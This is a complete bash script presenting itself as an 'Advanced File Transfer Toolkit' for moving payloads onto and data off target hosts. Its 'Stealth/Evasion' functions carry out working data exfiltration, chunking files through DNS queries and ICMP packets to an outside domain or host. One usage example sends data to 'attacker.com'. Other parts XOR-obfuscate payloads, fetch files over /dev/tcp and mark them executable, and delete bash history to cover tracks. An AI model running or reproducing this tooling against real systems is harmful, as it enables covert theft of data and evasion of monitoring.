#!/bin/bash

set -euo pipefail

RED=$(tput setaf 1 2>/dev/null || echo "")
GRN=$(tput setaf 2 2>/dev/null || echo "")
YEL=$(tput setaf 3 2>/dev/null || echo "")
BLU=$(tput setaf 4 2>/dev/null || echo "")
RST=$(tput sgr0 2>/dev/null || echo "")

SCRIPT_VERSION="2.0"
LOG_FILE="${XFER_LOG:-/tmp/.xfer.log}"

function log() {
  echo "[$(date '+%Y-%m-%d %H:%M:%S')] $*" >> "$LOG_FILE"
}

function usage() {
  cat <<EOF
${GRN}╔═══════════════════════════════════════════════════════════╗
║        XFER - Advanced File Transfer Toolkit v${SCRIPT_VERSION}     ║
╚═══════════════════════════════════════════════════════════╝${RST}

${YEL}Network Transfer:${RST}
  send <file> <ip> [port]           - Send file via netcat
  receive <ip> <port> <out>         - Receive file via /dev/tcp
  http-serve <file> [port]          - Serve via Python HTTP server
  http-get <url> <out>              - Download via bash /dev/tcp
  smb-serve <dir> [name]            - Serve directory via Impacket SMB
  tftp-serve <file>                 - Serve via TFTP (atftpd)

${YEL}Encoding/Decoding:${RST}
  b64-enc <file> [out]              - Base64 encode
  b64-dec [in] <out>                - Base64 decode
  hex-enc <file> [out]              - Hex encode
  hex-dec [in] <out>                - Hex decode
  gzip-b64 <file>                   - Gzip + Base64 encode
  split-b64 <file> <chunk_kb>       - Split and encode chunks

${YEL}Container/Cloud:${RST}
  k8s-cp <file> <pod> <ns> <dest>   - Kubernetes copy
  docker-cp <file> <container> <dest> - Docker copy
  s3-upload <file> <bucket> [key]   - AWS S3 upload
  gcs-upload <file> <bucket>        - Google Cloud Storage

${YEL}Stealth/Evasion:${RST}
  dns-exfil <file> <domain>         - DNS exfiltration (base32)
  icmp-exfil <file> <target>        - ICMP exfiltration
  http-post <file> <url>            - HTTP POST upload
  pastebin <file>                   - Upload to pastebin

${YEL}Utilities:${RST}
  checksum <file>                   - Show SHA256, MD5, SHA1
  obfuscate <file>                  - Simple XOR obfuscation
  deobfuscate <file>                - Deobfuscate XOR
  verify <file> <hash>              - Verify file integrity
  clean                             - Clean transfer artifacts

${YEL}Examples:${RST}
  $0 send payload.bin 10.10.14.5 9000
  $0 http-serve exploit.sh 8080
  $0 b64-enc shell.elf > shell.b64
  $0 gzip-b64 large_file.bin > compressed.b64
  $0 dns-exfil data.txt attacker.com
  $0 checksum payload.bin

${BLU}Logs: $LOG_FILE${RST}
EOF
}

# =============== NETWORK TRANSFER ===============

function send_file() {
  local FILE="$1" IP="$2" PORT="${3:-8000}"
  [[ ! -f "$FILE" ]] && echo "[${RED}!${RST}] File not found" && exit 1
  
  log "Sending $FILE to $IP:$PORT"
  echo "[${GRN}+${RST}] Serving '$FILE' on TCP $PORT..."
  echo "[${BLU}*${RST}] Remote: exec 3<>/dev/tcp/$IP/$PORT; cat <&3 > file"
  
  if command -v nc &>/dev/null; then
    nc -lvnp "$PORT" < "$FILE" || nc -lvp "$PORT" < "$FILE"
  else
    # Fallback: bash TCP listener
    bash -c "exec 3<>/dev/tcp/0.0.0.0/$PORT; cat '$FILE' >&3"
  fi
}

function receive_file() {
  local HOST="$1" PORT="$2" OUT="$3"
  log "Receiving from $HOST:$PORT -> $OUT"
  echo "[${GRN}+${RST}] Connecting to $HOST:$PORT..."
  
  exec 3<>/dev/tcp/"$HOST"/"$PORT"
  cat <&3 > "$OUT"
  exec 3<&- 3>&-
  
  chmod +x "$OUT" 2>/dev/null || true
  echo "[${GRN}✓${RST}] Received '$OUT' ($(stat -f%z "$OUT" \
    2>/dev/null || stat -c%s "$OUT") bytes)"
}

function http_serve() {
  local FILE="$1" PORT="${2:-8000}"
  log "HTTP serving $FILE on port $PORT"
  echo "[${GRN}+${RST}] Serving on http://0.0.0.0:$PORT"
  echo "[${BLU}*${RST}] Download: curl -O http://<IP>:$PORT/$FILE"
  
  if command -v python3 &>/dev/null; then
    python3 -m http.server "$PORT"
  elif command -v python &>/dev/null; then
    python -m SimpleHTTPServer "$PORT"
  else
    echo "[${RED}!${RST}] Python not found"
    exit 1
  fi
}

function http_get() {
  local URL="$1" OUT="$2"
  local HOST PORT PATH
  
  # Parse URL
  HOST=$(echo "$URL" | sed -E 's|^https?://([^/:]+).*|\1|')
  PORT=$(echo "$URL" | grep -oE ':[0-9]+' | tr -d ':')
  PORT="${PORT:-80}"
  PATH=$(echo "$URL" | sed -E 's|^https?://[^/]+(/.*)|\1|')
  
  log "HTTP GET $URL -> $OUT"
  echo "[${GRN}+${RST}] Downloading via /dev/tcp..."
  
  exec 3<>/dev/tcp/"$HOST"/"$PORT"
  echo -e "GET $PATH HTTP/1.1\r\nHost: $HOST\r\nConnection: close\r\n\r\n" >&3
  
  # Skip headers
  while IFS= read -r line <&3; do
    [[ "$line" == $'\r' ]] && break
  done
  
  cat <&3 > "$OUT"
  exec 3<&- 3>&-
  echo "[${GRN}✓${RST}] Downloaded to '$OUT'"
}

function smb_serve() {
  local DIR="$1" NAME="${2:-share}"
  
  if ! command -v impacket-smbserver &>/dev/null; then
    echo "[${RED}!${RST}] impacket-smbserver not found"
    echo "    Install: pip3 install impacket"
    exit 1
  fi
  
  log "SMB serving $DIR as $NAME"
  echo "[${GRN}+${RST}] Starting SMB server..."
  echo "[${BLU}*${RST}] Access: \\\\<IP>\\$NAME"
  impacket-smbserver "$NAME" "$DIR" -smb2support
}

function tftp_serve() {
  local FILE="$1"
  
  if ! command -v atftpd &>/dev/null; then
    echo "[${RED}!${RST}] atftpd not found (apt install atftpd)"
    exit 1
  fi
  
  local DIR=$(dirname "$FILE")
  log "TFTP serving $FILE"
  echo "[${GRN}+${RST}] Starting TFTP server on UDP 69..."
  echo "[${BLU}*${RST}] Get: tftp -g -r $(basename "$FILE") <IP>"
  sudo atftpd --daemon --no-fork "$DIR"
}

# =============== ENCODING/DECODING ===============

function base64_encode() {
  local FILE="$1" OUT="${2:-}"
  [[ ! -f "$FILE" ]] && echo "[${RED}!${RST}] File not found" && exit 1
  
  log "Base64 encoding $FILE"
  if [[ -n "$OUT" ]]; then
    base64 "$FILE" > "$OUT"
    echo "[${GRN}✓${RST}] Encoded to '$OUT'"
  else
    base64 "$FILE"
  fi
}

function base64_decode() {
  local IN="${1:--}" OUT="$2"
  
  log "Base64 decoding to $OUT"
  if [[ "$IN" == "-" ]]; then
    echo "[${YEL}!${RST}] Paste base64, then Ctrl+D:"
    base64 -d > "$OUT"
  else
    base64 -d "$IN" > "$OUT"
  fi
  
  chmod +x "$OUT" 2>/dev/null || true
  echo "[${GRN}✓${RST}] Decoded to '$OUT'"
}

function hex_encode() {
  local FILE="$1" OUT="${2:-}"
  [[ ! -f "$FILE" ]] && echo "[${RED}!${RST}] File not found" && exit 1
  
  log "Hex encoding $FILE"
  if [[ -n "$OUT" ]]; then
    xxd -p "$FILE" | tr -d '\n' > "$OUT"
    echo "[${GRN}✓${RST}] Encoded to '$OUT'"
  else
    xxd -p "$FILE" | tr -d '\n'
  fi
}

function hex_decode() {
  local IN="${1:--}" OUT="$2"
  
  log "Hex decoding to $OUT"
  if [[ "$IN" == "-" ]]; then
    echo "[${YEL}!${RST}] Paste hex, then Ctrl+D:"
    xxd -r -p > "$OUT"
  else
    xxd -r -p "$IN" > "$OUT"
  fi
  
  chmod +x "$OUT" 2>/dev/null || true
  echo "[${GRN}✓${RST}] Decoded to '$OUT'"
}

function gzip_base64() {
  local FILE="$1"
  [[ ! -f "$FILE" ]] && echo "[${RED}!${RST}] File not found" && exit 1
  
  log "Gzip+Base64 encoding $FILE"
  echo "[${GRN}+${RST}] Compressing and encoding..."
  gzip -c "$FILE" | base64
  echo "[${BLU}*${RST}] Decode: base64 -d | gunzip > file"
}

function split_base64() {
  local FILE="$1" CHUNK_KB="$2"
  [[ ! -f "$FILE" ]] && echo "[${RED}!${RST}] File not found" && exit 1
  
  local CHUNK_BYTES=$((CHUNK_KB * 1024))
  local PREFIX="${FILE}.chunk"
  
  log "Splitting $FILE into ${CHUNK_KB}KB chunks"
  echo "[${GRN}+${RST}] Splitting into ${CHUNK_KB}KB chunks..."
  
  split -b "$CHUNK_BYTES" "$FILE" "$PREFIX"
  
  for chunk in ${PREFIX}*; do
    base64 "$chunk" > "${chunk}.b64"
    echo "[${GRN}✓${RST}] Created ${chunk}.b64"
    rm "$chunk"
  done
  
  echo "[${BLU}*${RST}] Reassemble: cat *.b64 | base64 -d > $FILE"
}

# =============== CONTAINER/CLOUD ===============

function k8s_copy() {
  local FILE="$1" POD="$2" NAMESPACE="$3" DEST="$4"
  
  if ! command -v kubectl &>/dev/null; then
    echo "[${RED}!${RST}] kubectl not found"
    exit 1
  fi
  
  log "K8s copy $FILE to $POD ($NAMESPACE)"
  echo "[${GRN}+${RST}] Copying to pod '$POD' namespace '$NAMESPACE'"
  
  kubectl cp "$FILE" "$NAMESPACE/$POD:$DEST"
  kubectl exec -n "$NAMESPACE" "$POD" -- chmod +x "$DEST" 2>/dev/null || true
  
  echo "[${GRN}✓${RST}] Copied to $DEST"
}

function docker_copy() {
  local FILE="$1" CONTAINER="$2" DEST="$3"
  
  if ! command -v docker &>/dev/null; then
    echo "[${RED}!${RST}] docker not found"
    exit 1
  fi
  
  log "Docker copy $FILE to $CONTAINER"
  docker cp "$FILE" "$CONTAINER:$DEST"
  docker exec "$CONTAINER" chmod +x "$DEST" 2>/dev/null || true
  
  echo "[${GRN}✓${RST}] Copied to container:$DEST"
}

function s3_upload() {
  local FILE="$1" BUCKET="$2" KEY="${3:-$(basename "$FILE")}"
  
  if ! command -v aws &>/dev/null; then
    echo "[${RED}!${RST}] aws cli not found"
    exit 1
  fi
  
  log "S3 upload $FILE to s3://$BUCKET/$KEY"
  aws s3 cp "$FILE" "s3://$BUCKET/$KEY"
  echo "[${GRN}✓${RST}] Uploaded to s3://$BUCKET/$KEY"
}

function gcs_upload() {
  local FILE="$1" BUCKET="$2"
  
  if ! command -v gsutil &>/dev/null; then
    echo "[${RED}!${RST}] gsutil not found"
    exit 1
  fi
  
  log "GCS upload $FILE to gs://$BUCKET"
  gsutil cp "$FILE" "gs://$BUCKET/"
  echo "[${GRN}✓${RST}] Uploaded to gs://$BUCKET/"
}

# =============== STEALTH/EVASION ===============

function dns_exfil() {
  local FILE="$1" DOMAIN="$2"
  [[ ! -f "$FILE" ]] && echo "[${RED}!${RST}] File not found" && exit 1
  
  log "DNS exfil $FILE via $DOMAIN"
  echo "[${GRN}+${RST}] Exfiltrating via DNS..."
  echo "[${YEL}!${RST}] Requires DNS server logging queries"
  
  local DATA=$(base64 "$FILE" | tr -d '\n')
  local CHUNK_SIZE=63
  local TOTAL=${#DATA}
  local SENT=0
  
  while [[ $SENT -lt $TOTAL ]]; do
    local CHUNK="${DATA:$SENT:$CHUNK_SIZE}"
    local LABEL=$(printf "%d" $SENT | tr '0-9' 'a-j')
    
    dig "${LABEL}.${CHUNK}.${DOMAIN}" +short &>/dev/null &
    
    SENT=$((SENT + CHUNK_SIZE))
    echo -ne "\r[${BLU}*${RST}] Progress: $((SENT * 100 / TOTAL))%"
    sleep 0.1
  done
  
  echo -e "\n[${GRN}✓${RST}] Exfiltration complete"
}

function icmp_exfil() {
  local FILE="$1" TARGET="$2"
  [[ ! -f "$FILE" ]] && echo "[${RED}!${RST}] File not found" && exit 1
  
  if ! command -v hping3 &>/dev/null; then
    echo "[${RED}!${RST}] hping3 not found"
    exit 1
  fi
  
  log "ICMP exfil $FILE to $TARGET"
  echo "[${GRN}+${RST}] Exfiltrating via ICMP..."
  
  local DATA=$(xxd -p "$FILE" | tr -d '\n')
  local CHUNK_SIZE=32
  
  for ((i=0; i<${#DATA}; i+=CHUNK_SIZE)); do
    local CHUNK="${DATA:$i:$CHUNK_SIZE}"
    hping3 -1 -d 64 --data "$CHUNK" "$TARGET" -c 1 &>/dev/null
    echo -ne "\r[${BLU}*${RST}] Sent $((i + CHUNK_SIZE)) bytes"
  done
  
  echo -e "\n[${GRN}✓${RST}] Exfiltration complete"
}

function http_post() {
  local FILE="$1" URL="$2"
  [[ ! -f "$FILE" ]] && echo "[${RED}!${RST}] File not found" && exit 1
  
  log "HTTP POST $FILE to $URL"
  
  if command -v curl &>/dev/null; then
    curl -X POST -F "file=@$FILE" "$URL"
  elif command -v wget &>/dev/null; then
    wget --post-file="$FILE" "$URL" -O -
  else
    echo "[${RED}!${RST}] curl/wget not found"
    exit 1
  fi
  
  echo "[${GRN}✓${RST}] Posted to $URL"
}

function pastebin_upload() {
  local FILE="$1"
  [[ ! -f "$FILE" ]] && echo "[${RED}!${RST}] File not found" && exit 1
  
  log "Pastebin upload $FILE"
  local CONTENT=$(cat "$FILE" | base64)
  
  # Using transfer.sh as example
  local URL=$(curl --upload-file "$FILE" https://transfer.sh/$(basename "$FILE"))
  echo "[${GRN}✓${RST}] Uploaded: $URL"
  echo "$URL" | tee -a "$LOG_FILE"
}

# =============== UTILITIES ===============

function checksum() {
  local FILE="$1"
  [[ ! -f "$FILE" ]] && echo "[${RED}!${RST}] File not found" && exit 1
  
  echo "[${GRN}+${RST}] Checksums for '$FILE':"
  echo "  SHA256: $(sha256sum "$FILE" 2>/dev/null || shasum -a 256 "$FILE")"
  echo "  MD5:    $(md5sum "$FILE" 2>/dev/null || md5 "$FILE")"
  echo "  SHA1:   $(sha1sum "$FILE" 2>/dev/null || shasum -a 1 "$FILE")"
}

function obfuscate() {
  local FILE="$1"
  local KEY=0xAA
  [[ ! -f "$FILE" ]] && echo "[${RED}!${RST}] File not found" && exit 1
  
  log "Obfuscating $FILE"
  python3 - "$FILE" <<'PY'
import sys
with open(sys.argv[1], 'rb') as f:
    data = bytearray(f.read())
obf = bytearray(b ^ 0xAA for b in data)
with open(sys.argv[1] + '.obf', 'wb') as f:
    f.write(obf)
PY
  
  echo "[${GRN}✓${RST}] Created ${FILE}.obf"
  echo "[${BLU}*${RST}] Deobfuscate: $0 deobfuscate ${FILE}.obf"
}

function deobfuscate() {
  local FILE="$1"
  [[ ! -f "$FILE" ]] && echo "[${RED}!${RST}] File not found" && exit 1
  
  log "Deobfuscating $FILE"
  python3 - "$FILE" <<'PY'
import sys
with open(sys.argv[1], 'rb') as f:
    data = bytearray(f.read())
deobf = bytearray(b ^ 0xAA for b in data)
with open(sys.argv[1].replace('.obf', '.deobf'), 'wb') as f:
    f.write(deobf)
PY
  
  local OUT="${FILE/.obf/.deobf}"
  chmod +x "$OUT" 2>/dev/null || true
  echo "[${GRN}✓${RST}] Created $OUT"
}

function verify() {
  local FILE="$1" HASH="$2"
  [[ ! -f "$FILE" ]] && echo "[${RED}!${RST}] File not found" && exit 1
  
  local ACTUAL=$(sha256sum "$FILE" 2>/dev/null || shasum -a 256 "$FILE" | cut -d' ' -f1)
  
  if [[ "$ACTUAL" == "$HASH" ]]; then
    echo "[${GRN}✓${RST}] Hash verified!"
  else
    echo "[${RED}!${RST}] Hash mismatch!"
    echo "    Expected: $HASH"
    echo "    Got:      $ACTUAL"
    exit 1
  fi
}

function clean() {
  log "Cleaning artifacts"
  echo "[${YEL}!${RST}] Cleaning transfer artifacts..."
  
  rm -f decoded_file *.b64 *.hex *.chunk* *.obf 2>/dev/null || true
  
  # Clear bash history entries
  history -d $(history 1 | awk '{print $1}')
  
  echo "[${GRN}✓${RST}] Cleaned"
}

# =============== MAIN ===============

[[ $# -lt 1 ]] && usage && exit 1

CMD="$1"; shift

case "$CMD" in
  send)            [[ $# -lt 2 ]] && usage && exit 1; send_file "$@" ;;
  receive)         [[ $# -lt 3 ]] && usage && exit 1; receive_file "$@" ;;
  http-serve)      [[ $# -lt 1 ]] && usage && exit 1; http_serve "$@" ;;
  http-get)        [[ $# -lt 2 ]] && usage && exit 1; http_get "$@" ;;
  smb-serve)       [[ $# -lt 1 ]] && usage && exit 1; smb_serve "$@" ;;
  tftp-serve)      [[ $# -lt 1 ]] && usage && exit 1; tftp_serve "$@" ;;
  
  b64-enc)         [[ $# -lt 1 ]] && usage && exit 1; base64_encode "$@" ;;
  b64-dec)         [[ $# -lt 1 ]] && usage && exit 1; base64_decode "$@" ;;
  hex-enc)         [[ $# -lt 1 ]] && usage && exit 1; hex_encode "$@" ;;
  hex-dec)         [[ $# -lt 1 ]] && usage && exit 1; hex_decode "$@" ;;
  gzip-b64)        [[ $# -ne 1 ]] && usage && exit 1; gzip_base64 "$1" ;;
  split-b64)       [[ $# -ne 2 ]] && usage && exit 1; split_base64 "$@" ;;
  
  k8s-cp)          [[ $# -ne 4 ]] && usage && exit 1; k8s_copy "$@" ;;
  docker-cp)       [[ $# -ne 3 ]] && usage && exit 1; docker_copy "$@" ;;
  s3-upload)       [[ $# -lt 2 ]] && usage && exit 1; s3_upload "$@" ;;
  gcs-upload)      [[ $# -ne 2 ]] && usage && exit 1; gcs_upload "$@" ;;
  
  dns-exfil)       [[ $# -ne 2 ]] && usage && exit 1; dns_exfil "$@" ;;
  icmp-exfil)      [[ $# -ne 2 ]] && usage && exit 1; icmp_exfil "$@" ;;
  http-post)       [[ $# -ne 2 ]] && usage && exit 1; http_post "$@" ;;
  pastebin)        [[ $# -ne 1 ]] && usage && exit 1; pastebin_upload "$1" ;;
  
  checksum)        [[ $# -ne 1 ]] && usage && exit 1; checksum "$1" ;;
  obfuscate)       [[ $# -ne 1 ]] && usage && exit 1; obfuscate "$1" ;;
  deobfuscate)     [[ $# -ne 1 ]] && usage && exit 1; deobfuscate "$1" ;;
  verify)          [[ $# -ne 2 ]] && usage && exit 1; verify "$@" ;;
  clean)           clean ;;
  
  -h|--help)       usage ;;
  *)               echo "[${RED}ERR${RST}] Unknown command: $CMD"; usage; exit 1 ;;
esac
